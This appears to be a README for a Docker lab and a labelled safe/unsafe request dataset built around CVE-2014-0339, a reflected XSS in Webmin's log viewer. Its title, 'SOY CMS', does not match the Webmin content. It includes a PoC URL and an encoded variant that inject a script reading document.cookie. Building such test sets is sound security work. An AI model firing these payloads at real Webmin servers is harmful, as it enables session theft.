# SOY CMS

## Building information

```console
$ docker build -t webmin ./
$ docker run -d -it --rm --name webmin -p 8080:80 webmin
```

## Vulnerability Details

- CVE-2014-0339
- https://github.com/webmin/webmin/commit/3b6234b511f97d18f4941c618ac594e73d8f7bda

### PoC

`http://localhost:8080/webminlog/view.cgi?id=1&search=e"><script>alert(document.cookie);</script>`

## Datasets

### Safe

- <./datasets/safe-1.html>
  - `http://localhost:8080/webminlog/view.cgi?id=1495700059.929.0&return=&returndesc=&search=uall%3D1%26mall%3D1%26module%3Dglobal%26tall%3D2%26from_d%3D%26from_m%3D1%26from_y%3D%26to_d%3D%26to_m%3D1%26to_y%3D%26desc%3D%26long%3D0`
- <./datasets/safe-2.html>
  - `http://localhost:8080/webminlog/view.cgi?id=1495700630.1031.0&return=&returndesc=&search=uall%3D1%26mall%3D1%26module%3Dglobal%26tall%3D2%26from_d%3D%26from_m%3D1%26from_y%3D%26to_d%3D%26to_m%3D1%26to_y%3D%26desc%3D%26fall%3D1%26file%3D%26dall%3D1%26diff%3D%26long%3D0`
- <./datasets/safe-3.html>
  - `http://localhost:8080/webminlog/view.cgi?id=1495700059.929.0&return=&returndesc=&search=uall%3D1%26mall%3D1%26module%3Dglobal%26tall%3D1%26from_d%3D%26from_m%3D1%26from_y%3D%26to_d%3D%26to_m%3D1%26to_y%3D%26desc%3D%26fall%3D1%26file%3D%26dall%3D1%26diff%3D%26long%3D0`

### Unsafe

- <./datasets/xss-1.html>
  - `http://localhost:8080/webminlog/view.cgi?id=1495700630.1031.0&return=&returndesc=&search=e%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E`
